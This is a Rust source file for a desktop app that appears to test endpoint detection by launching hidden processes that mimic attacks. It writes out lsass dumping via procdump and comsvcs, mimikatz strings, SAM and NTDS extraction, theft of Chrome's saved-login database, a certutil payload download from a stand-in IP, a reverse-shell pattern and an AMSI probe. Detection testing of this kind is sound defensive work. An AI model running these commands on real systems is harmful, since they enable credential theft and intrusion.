use serde::Serialize;
use std::time::{Duration, Instant};

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    stdout: String,
    stderr: String,
    exit_code: i32,
    duration_ms: u64,
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
const SCRIPT_TIMEOUT: Duration = Duration::from_secs(15);

#[cfg(target_os = "windows")]
struct ScriptOutcome {
    stdout: String,
    stderr: String,
    exit_code: i32,
    completed: bool,
}

#[cfg(target_os = "windows")]
fn run_detached_ps(script: &str, timeout: Duration) -> Result<ScriptOutcome, String> {
    use std::fs;

    let id = uuid::Uuid::new_v4().to_string();
    let script_path = std::env::temp_dir().join(format!("guardz_{}.ps1", &id[..8]));
    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}.json", &id[..8]));

    let wrapped = format!(
        r#"$ErrorActionPreference='Continue'
$stdoutBuf=''
$stderrBuf=''
try {{
    $output = Invoke-Command -ScriptBlock {{
        {script}
    }} 2>&1
    foreach ($item in $output) {{
        if ($item -is [System.Management.Automation.ErrorRecord]) {{
            $stderrBuf += $item.ToString() + "`n"
        }} else {{
            $stdoutBuf += $item.ToString() + "`n"
        }}
    }}
    @{{ stdout=$stdoutBuf; stderr=$stderrBuf; exitCode=0; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
}} catch {{
    @{{ stdout=$stdoutBuf; stderr=$_.Exception.Message; exitCode=1; completed=$true }} | ConvertTo-Json | Set-Content -Path '{sentinel}'
}}"#,
        sentinel = sentinel_path.to_string_lossy().replace('\'', "''")
    );

    fs::write(&script_path, &wrapped).map_err(|e| e.to_string())?;

    std::process::Command::new("cmd.exe")
        .args([
            "/c", "start", "", "/b",
            "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy(),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| e.to_string())?;

    let start = Instant::now();
    loop {
        if sentinel_path.exists() {
            std::thread::sleep(Duration::from_millis(100));
            let content = fs::read_to_string(&sentinel_path).unwrap_or_default();
            let _ = fs::remove_file(&sentinel_path);
            let _ = fs::remove_file(&script_path);

            if let Ok(val) = serde_json::from_str::<serde_json::Value>(&content) {
                return Ok(ScriptOutcome {
                    stdout: val["stdout"].as_str().unwrap_or("").to_string(),
                    stderr: val["stderr"].as_str().unwrap_or("").to_string(),
                    exit_code: val["exitCode"].as_i64().unwrap_or(0) as i32,
                    completed: val["completed"].as_bool().unwrap_or(false),
                });
            }
            return Ok(ScriptOutcome {
                stdout: content,
                stderr: String::new(),
                exit_code: 0,
                completed: true,
            });
        }

        if start.elapsed() > timeout {
            let _ = fs::remove_file(&script_path);
            let _ = fs::remove_file(&sentinel_path);
            return Ok(ScriptOutcome {
                stdout: String::new(),
                stderr: "Process was terminated by endpoint protection".to_string(),
                exit_code: -1,
                completed: false,
            });
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

#[cfg(target_os = "windows")]
fn run_detached_cmd(program: &str, args: &[&str], timeout: Duration) -> Result<ScriptOutcome, String> {
    use std::fs;

    let id = uuid::Uuid::new_v4().to_string();
    let stdout_path = std::env::temp_dir().join(format!("guardz_{}_out.txt", &id[..8]));
    let stderr_path = std::env::temp_dir().join(format!("guardz_{}_err.txt", &id[..8]));
    let sentinel_path = std::env::temp_dir().join(format!("guardz_{}_done.txt", &id[..8]));

    let args_str = args.iter()
        .map(|a| if a.contains(' ') { format!("\"{}\"", a) } else { a.to_string() })
        .collect::<Vec<_>>()
        .join(" ");

    let bat_path = std::env::temp_dir().join(format!("guardz_{}.bat", &id[..8]));
    let bat_content = format!(
        "@echo off\r\n{program} {args_str} >\"{stdout}\" 2>\"{stderr}\"\r\necho %ERRORLEVEL% >\"{sentinel}\"\r\n",
        stdout = stdout_path.to_string_lossy(),
        stderr = stderr_path.to_string_lossy(),
        sentinel = sentinel_path.to_string_lossy(),
    );

    fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;

    std::process::Command::new("cmd.exe")
        .args(["/c", "start", "", "/b", "cmd.exe", "/c", &bat_path.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .map_err(|e| e.to_string())?;

    let start = Instant::now();
    loop {
        if sentinel_path.exists() {
            std::thread::sleep(Duration::from_millis(100));
            let exit_str = fs::read_to_string(&sentinel_path).unwrap_or_default();
            let stdout = fs::read_to_string(&stdout_path).unwrap_or_default();
            let stderr = fs::read_to_string(&stderr_path).unwrap_or_default();
            let exit_code = exit_str.trim().parse::<i32>().unwrap_or(-1);

            let _ = fs::remove_file(&bat_path);
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            let _ = fs::remove_file(&sentinel_path);

            return Ok(ScriptOutcome {
                stdout,
                stderr,
                exit_code,
                completed: true,
            });
        }

        if start.elapsed() > timeout {
            let _ = fs::remove_file(&bat_path);
            let _ = fs::remove_file(&stdout_path);
            let _ = fs::remove_file(&stderr_path);
            let _ = fs::remove_file(&sentinel_path);
            return Ok(ScriptOutcome {
                stdout: String::new(),
                stderr: "Process was terminated by endpoint protection".to_string(),
                exit_code: -1,
                completed: false,
            });
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

#[tauri::command]
fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "macro-tamper" => run_macro_tamper(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        other => Err(format!("Unknown scenario: {}", other)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        #[cfg(target_os = "windows")]
        Ok((message, outcome)) => {
            let status = if !outcome.completed {
                "mitigated"
            } else if outcome.exit_code == 0 {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout: outcome.stdout,
                stderr: outcome.stderr,
                exit_code: outcome.exit_code,
                duration_ms,
            })
        }
        #[cfg(not(target_os = "windows"))]
        Ok((message, output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let exit_code = output.status.code().unwrap_or(-1);
            let status = if output.status.success() {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout,
                stderr,
                exit_code,
                duration_ms,
            })
        }
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: -1,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

#[cfg(target_os = "windows")]
type ScenarioResult = Result<(String, ScriptOutcome), String>;

#[cfg(not(target_os = "windows"))]
type ScenarioResult = Result<(String, std::process::Output), String>;

// ── Windows scenario implementations ──
// Pattern: Use Start-Process to spawn detached child processes.
// Command lines look malicious to EDR but actual execution is harmless.
// This breaks the process tree so S1 doesn't kill our Tauri app.

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> ScenarioResult {
    let run_id = uuid::Uuid::new_v4().to_string();
    let fake_in = std::env::temp_dir().join(format!("fake_dump_{}.bin", &run_id[..8]));
    let script = format!(
        r#"
$fakeIn = '{fake_in}'
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$hives = "SAM", "SYSTEM", "SECURITY"
$procs = @()
foreach ($hive in $hives) {{
    1..3 | ForEach-Object {{
        $proc = Start-Process "cmd.exe" `
            -ArgumentList "/c certutil.exe -encode `"$fakeIn`" `"$env:TEMP\config_${{hive}}_{rid}.bin`"" `
            -WindowStyle Hidden -PassThru
        $procs += $proc
    }}
}}
Start-Sleep -Seconds 2
Write-Output "Spawned $($procs.Count) certutil processes targeting SAM/SYSTEM/SECURITY"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
foreach ($hive in $hives) {{ Remove-Item "$env:TEMP\config_${{hive}}_{rid}.bin" -Force -ErrorAction SilentlyContinue }}
"#,
        fake_in = fake_in.to_string_lossy(),
        rid = &run_id[..8]
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Certutil credential dump pattern (9 processes targeting SAM/SYSTEM/SECURITY)".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> ScenarioResult {
    let fake_out = std::env::temp_dir().join(format!("rdp_emu_{}.txt", &uuid::Uuid::new_v4().to_string()[..8]));
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
"SentinelOne Emulation Test" | Out-File $fakeOut -Force
$maliciousCmd = 'Invoke-Command -ComputerName TESTHOST -ScriptBlock {{ Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "DenyTSConnections" -Value 0 }}'
$process = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -Command `"`$null = `$env:TEMP; $maliciousCmd; ''benign_emulation'' | Out-File ''$fakeOut'' -Append`"" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "RDP emulation process completed (Exit code: $($process.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy()
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("RDP remote enable emulation via Invoke-Command telemetry".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> ScenarioResult {
    let script = r#"
$type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($type) {
    $field = $type.GetField('amsiContext', 'NonPublic,Static')
    if ($field) {
        Write-Output "AMSI type and field resolved via Reflection"
        Write-Output "Field type: $($field.FieldType.Name)"
        Write-Output "Current value: $($field.GetValue($null))"
    } else {
        Write-Output "AMSI type found but field inaccessible"
    }
} else {
    Write-Output "AMSI type not available"
}
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("AMSI inspection via .NET Reflection".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> ScenarioResult {
    let task_prefix = format!("S1Emu_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let script = format!(
        r#"
$tasks = @()
$psCmd = 'Get-Process lsass | Select-Object Id,ProcessName,Path | Out-File C:\Windows\Temp\lsass_info.txt'
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))

$task1 = "{prefix}_ProcDumpLSASS"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task1`" /TR `"cmd.exe /c procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $task1
Start-Sleep -Milliseconds 500

$task2 = "{prefix}_MimikatzPattern"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task2`" /TR `"cmd.exe /c echo privilege::debug sekurlsa::logonpasswords exit > C:\Windows\Temp\mimi.log`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $task2
Start-Sleep -Milliseconds 500

$task3 = "{prefix}_ComsvcsLsass"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task3`" /TR `"cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 0 C:\Windows\Temp\lsass.dmp full`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $task3
Start-Sleep -Milliseconds 500

$task4 = "{prefix}_EncodedPSLsass"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task4`" /TR `"powershell.exe -EncodedCommand $encoded -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $task4

Write-Output "Created $($tasks.Count) credential harvesting tasks"
foreach ($t in $tasks) {{
    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
}}
Write-Output "All tasks cleaned up"
"#,
        prefix = task_prefix
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("LSASS credential dump emulation (scheduled tasks with mimikatz/procdump/comsvcs patterns)".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> ScenarioResult {
    let script = r#"
function Test-NetworkConnectivity {
    param([string]$TargetHost = '127.0.0.1', [int]$TargetPort = 4444)
    $ErrorActionPreference = 'SilentlyContinue'
    try {
        $socket = New-Object Net.Sockets.TCPClient($TargetHost, $TargetPort)
        $netStream = $socket.GetStream()
        $reader = New-Object System.IO.StreamReader($netStream)
        $writer = New-Object System.IO.StreamWriter($netStream)
        $writer.AutoFlush = $true
        $writer.WriteLine("whoami")
        $response = $reader.ReadLine()
        $result = Invoke-Expression "Write-Output '$response'" 2>&1 | Out-String
        Write-Output $result
    } catch {
        Write-Output "Connection test completed with expected failure"
    } finally {
        if ($socket) { $socket.Close() }
    }
}
Test-NetworkConnectivity
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("Reverse shell TCP pattern (StreamReader + Invoke-Expression)".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> ScenarioResult {
    let task_prefix = format!("S1Emu_CredHarv_{}", &uuid::Uuid::new_v4().to_string()[..8]);
    let script = format!(
        r#"
$tasks = @()

$task1 = "{prefix}_RegSaveSAM"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task1`" /TR `"cmd.exe /c reg save HKLM\SAM C:\Windows\Temp\sam.hiv & reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $task1
Start-Sleep -Milliseconds 500

$task2 = "{prefix}_ChromeCreds"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$task2`" /TR `"cmd.exe /c copy `"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`" C:\Windows\Temp\chrome_creds.db /Y`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $task2
Start-Sleep -Milliseconds 500

$task3 = "{prefix}_NtdsutilDump"
Start-Process "schtasks.exe" -ArgumentList '/Create /TN "{prefix}_NtdsutilDump" /TR "cmd.exe /c ntdsutil `"activate instance ntds`" ifm `"create full C:\Windows\Temp\ntds_dump`" quit quit" /SC ONCE /ST 23:59 /F /RL HIGHEST' -WindowStyle Hidden -Wait
$tasks += $task3

Write-Output "Created $($tasks.Count) suspicious persistence tasks"
foreach ($t in $tasks) {{
    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
}}
Write-Output "All tasks cleaned up"
"#,
        prefix = task_prefix
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("Suspicious scheduled tasks (SAM export, browser creds, NTDS extraction)".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> ScenarioResult {
    let script = r#"
$suspicious = "GetAsyncKeyState;SetWindowsHookExA;NtUserGetAsyncKeyState;GetWindowTextA;WM_KEYBOARD_LL"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($suspicious))

$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
$codeBytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$codeEncoded = [Convert]::ToBase64String($codeBytes)

$proc = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -EncodedCommand $codeEncoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "Encoded command executed (Exit code: $($proc.ExitCode))"
Write-Output "Base64 payload contained suspicious API strings"
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("Base64-encoded PowerShell with suspicious API string payload".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_macro_tamper() -> ScenarioResult {
    let script = r#"
$versions = "14.0", "15.0", "16.0"
$paths = @()
foreach ($v in $versions) {
    $p = "HKCU:\Software\Microsoft\Office\$v\SecurityTestEmu"
    if (!(Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
    $paths += $p
    New-ItemProperty -Path $p -Name "AccessVBOM" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "VbaWarnings" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "MacroPolicyOverride" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "VBEBypassFlag" -Value 1 -PropertyType DWORD -Force | Out-Null
    Write-Output "Created macro security keys for Office $v"
}
foreach ($p in $paths) {
    Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Output "All emulation registry keys cleaned up"
"#;
    let outcome = run_detached_ps(script, SCRIPT_TIMEOUT)?;
    Ok(("Office macro security tampering (AccessVBOM + VbaWarnings across Office versions)".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> ScenarioResult {
    let run_id = &uuid::Uuid::new_v4().to_string()[..8];
    let script = format!(
        r#"
$fakeIn = "$env:TEMP\fake_lotl_{rid}.bin"
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$proc = Start-Process "cmd.exe" `
    -ArgumentList "/c certutil.exe -urlcache -split -f http://192.0.2.1/payload.exe $env:TEMP\payload_{rid}.exe" `
    -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 3
if (!$proc.HasExited) {{ $proc.Kill() }}
$proc2 = Start-Process "cmd.exe" `
    -ArgumentList "/c certutil.exe -encode `"$fakeIn`" `"$env:TEMP\encoded_{rid}.b64`"" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "LOLBin certutil processes spawned (urlcache + encode)"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\payload_{rid}.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\encoded_{rid}.b64" -Force -ErrorAction SilentlyContinue
"#,
        rid = run_id
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("LOLBin certutil download + encode pattern".to_string(), outcome))
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> ScenarioResult {
    let fake_out = std::env::temp_dir().join(format!("bloodhound_{}.txt", &uuid::Uuid::new_v4().to_string()[..8]));
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
$harmless = "echo benign > `"$fakeOut`""
$bhCmd = "Invoke-BloodHound -CollectionMethod All -Domain CONTOSO.LOCAL; Get-BloodHoundData; $harmless"
$proc = Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $bhCmd" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "BloodHound emulation completed (Exit code: $($proc.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy()
    );
    let outcome = run_detached_ps(&script, SCRIPT_TIMEOUT)?;
    Ok(("BloodHound AD recon emulation (Invoke-BloodHound -CollectionMethod All)".to_string(), outcome))
}

// ── macOS mock implementations ──

#[cfg(not(target_os = "windows"))]
fn mock_output() -> std::process::Output {
    std::process::Output {
        status: std::process::ExitStatus::default(),
        stdout: b"mock output (macOS dev mode)".to_vec(),
        stderr: Vec::new(),
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(900));
    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(400));
    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_macro_tamper() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![execute_scenario, reset_scenarios])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
